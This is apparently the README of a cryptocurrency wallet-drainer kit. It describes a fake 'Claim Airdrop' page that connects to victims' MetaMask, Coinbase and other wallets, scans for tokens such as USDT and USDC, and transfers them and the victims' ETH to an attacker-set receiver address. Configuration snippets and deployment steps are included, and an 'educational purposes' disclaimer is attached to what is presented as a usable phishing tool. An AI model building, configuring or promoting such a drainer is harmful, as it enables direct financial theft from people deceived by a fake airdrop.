# Ethereum Multi-Wallet Drainer

A comprehensive Ethereum wallet drainer that supports multiple wallet providers and can drain both ETH and ERC-20 tokens.

## Features

### 🎯 **Multi-Wallet Support**
- MetaMask
- Coinbase Wallet  
- Trust Wallet
- Rainbow Wallet
- WalletConnect
- Brave Wallet
- Opera Wallet
- Phantom (ETH)
- Rabby Wallet
- Frame
- Talisman

### 💰 **Asset Draining**
- **ETH**: Drains native Ethereum with gas optimization
- **ERC-20 Tokens**: Automatically drains popular tokens including:
  - USDT (Tether)
  - USDC (USD Coin)
  - LINK (Chainlink)
  - UNI (Uniswap)
  - WETH (Wrapped Ethereum)
  - SHIB (Shiba Inu)
  - PEPE (Pepe)

### 📱 **Mobile Support**
- Deep links for mobile wallet apps
- Responsive design for mobile browsers
- Fallback to app store downloads

## How It Works

1. **Wallet Detection**: Automatically detects installed wallet extensions
2. **Connection**: Connects to selected wallet provider
3. **Token Scanning**: Scans for ERC-20 token balances
4. **Sequential Draining**: 
   - First drains ERC-20 tokens (requires ETH for gas)
   - Then drains remaining ETH (leaves minimal amount for final gas)
5. **Transaction Signing**: Each token requires individual user approval

## Configuration

### Receiver Address
Update the `RECEIVER_ADDRESS` in `scripts/scripts.js`:
```javascript
const RECEIVER_ADDRESS = "0x742d35Cc6634C0532925a3b8D79dCf4c6e3c6C8f"; // Your ETH address
```

### Token List
Modify the `COMMON_TOKENS` array to add/remove tokens:
```javascript
const COMMON_TOKENS = [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
    // Add more tokens here
];
```

## Technical Details

### Dependencies
- **jQuery 3.6.0**: DOM manipulation
- **Ethers.js 5.7.2**: Ethereum interactions
- **Web3 Provider**: Wallet communication

### Network Support
- Ethereum Mainnet (default)
- Can be modified for other EVM chains

### Security Features
- Gas optimization to ensure transactions complete
- Error handling for failed token transfers
- Fallback mechanisms for different wallet types

## Usage

1. Open `index.html` in a web browser
2. Select your wallet from the dropdown
3. Click "Connect Wallet"
4. Approve the connection in your wallet
5. Click "Claim Airdrop" to start the draining process
6. Approve each token transfer individually

## File Structure

```
eth-drainer/
├── index.html          # Main HTML file with EthMax airdrop theme
├── scripts/
│   └── scripts.js      # Main JavaScript logic
└── README.md          # This file
```

## Educational Purpose

This code is for educational purposes only. It demonstrates:
- Multi-wallet integration patterns
- ERC-20 token interaction
- Ethereum transaction handling
- Mobile wallet deep linking
- Gas optimization strategies

## Differences from Solana Version

### Transaction Model
- **Ethereum**: Each token requires separate transaction + approval
- **Solana**: Can batch multiple token transfers

### Gas Fees
- **Ethereum**: Must preserve ETH for gas fees
- **Solana**: Lower fees, simpler fee structure

### Wallet Ecosystem
- **Ethereum**: More mature wallet ecosystem with standardized APIs
- **Solana**: Newer ecosystem with evolving standards

### Token Standards
- **Ethereum**: ERC-20 standard with approve/transfer pattern
- **Solana**: SPL token standard with different architecture

---

⚠️ **Disclaimer**: This is educational code for learning blockchain development. Use responsibly and in accordance with applicable laws.
